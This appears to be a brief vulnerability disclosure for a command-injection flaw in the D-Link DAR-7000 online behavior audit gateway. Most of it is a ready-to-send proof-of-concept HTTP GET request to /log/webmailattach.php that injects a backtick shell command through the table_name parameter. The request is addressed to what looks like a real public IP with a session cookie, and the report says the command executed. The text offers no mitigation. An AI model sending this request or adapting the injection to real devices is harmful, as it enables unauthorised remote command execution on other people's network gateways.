The D-LINK DAR-7000 series online behavior audit gateway has a RCE vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/log/webmailattach.php
poc：
```
GET /log/webmailattach.php?attach1=&attach2=(null)&table_name=`sleep${IFS}10`&mail_file_path=1 HTTP/1.1
Host: 60.22.74.195:8443
Cookie: PHPSESSID=16b7d22c9d0e23596f887c0d3f7e7920
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 219.142.42.9
Te: trailers
Connection: close

```

Successfully executed command
<img width="683" alt="image" src="https://github.com/ggg48966/cve/assets/51871401/ee223f68-1e94-483c-af38-4781276626d5">
